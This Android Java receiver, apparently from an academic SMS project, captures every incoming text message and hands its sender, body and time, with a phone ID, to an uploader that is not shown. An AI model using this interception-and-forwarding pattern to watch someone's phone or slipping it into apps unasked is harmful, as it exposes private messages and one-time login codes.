package edu.pku.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class IncomingSMS extends BroadcastReceiver {

    private static class MySMS {
        String sender;
        String content;
        String date;
    }

    public void onReceive(Context context, Intent intent) {

        // Retrieves a map of extended data from the intent.
        final Bundle bundle = intent.getExtras();

        try {
            String phoneID = PhoneID.getPhoneID(null);
            Map<String, MySMS> msgs = RetrieveMessages(intent);

            for (MySMS mySMS : msgs.values()) {
                SmsUploader.upload(phoneID, mySMS.sender, mySMS.content, mySMS.date);
            }
        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception occured: " + e);
        }
    }

    private static Map<String, MySMS> RetrieveMessages(Intent intent) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.CHINA);

        Map<String, MySMS> resultMap = null;
        SmsMessage[] msgs = null;
        Bundle bundle = intent.getExtras();

        if (bundle != null && bundle.containsKey("pdus")) {
            Object[] pdus = (Object[]) bundle.get("pdus");

            if (pdus != null && pdus.length > 0) {
                resultMap = new HashMap<String, MySMS>(pdus.length);
                msgs = new SmsMessage[pdus.length];

                // There can be multiple SMS from multiple senders, there can be a maximum of
                // nbrOfpdus different senders
                // However, send long SMS of same sender in one message
                for (int i = 0; i < pdus.length; i++) {
                    msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);

                    String originatingAddress = msgs[i].getOriginatingAddress();

                    // Check if index with number exists
                    if (!resultMap.containsKey(originatingAddress)) {
                        MySMS mySMS = new MySMS();

                        mySMS.sender = originatingAddress;
                        mySMS.content = msgs[i].getMessageBody();

                        Date date = new Date(msgs[i].getTimestampMillis());
                        mySMS.date = sdf.format(date);

                        // Index with number doesn't exist
                        // Save string into associative array with sender number as index
                        resultMap.put(msgs[i].getOriginatingAddress(), mySMS);
                    } else {
                        // Number has been there, add content but consider that
                        // msg.get(originatinAddress) already contains sms:sndrNbr:previousparts
                        // of SMS, so just add the part of the current PDU
                        MySMS mySMS = resultMap.get(originatingAddress);
                        mySMS.content += msgs[i].getMessageBody();
                    }
                }
            }
        }

        return resultMap;
    }
}
